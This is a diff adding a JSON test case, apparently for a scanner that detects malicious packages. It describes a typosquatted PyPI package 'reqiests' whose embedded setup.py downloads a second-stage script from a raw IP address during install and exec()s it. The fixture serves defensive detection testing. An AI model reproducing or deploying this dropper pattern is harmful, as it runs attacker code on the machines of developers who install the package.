@@ -1,0 +1,21 @@
+{
+  "name": "pypi-setup-urlopen-exec-dropper",
+  "expect": "block",
+  "expectFinding": "code-execution",
+  "cohort": "pypi",
+  "note": "setup.py fetches a second-stage payload over HTTP at install time and exec()s the response body — remote code execution during `pip install`. Package name typosquats `requests`.",
+  "evidence": {
+    "packageName": "reqiests",
+    "sourceFiles": {
+      "setup.py": "from setuptools import setup\nfrom urllib.request import urlopen\n\n_stage2 = urlopen(\"http://185.62.188.12/p.py\").read()\nexec(_stage2)\n\nsetup(name=\"reqiests\", version=\"9.9.9\", py_modules=[\"reqiests\"])\n"
+    },
+    "npmMetadata": {
+      "name": "reqiests",
+      "version": "9.9.9",
+      "repository": null,
+      "maintainers": [{ "name": "anon-777", "role": "Owner" }],
+      "dist": null,
+      "deprecated": null
+    }
+  }
+}
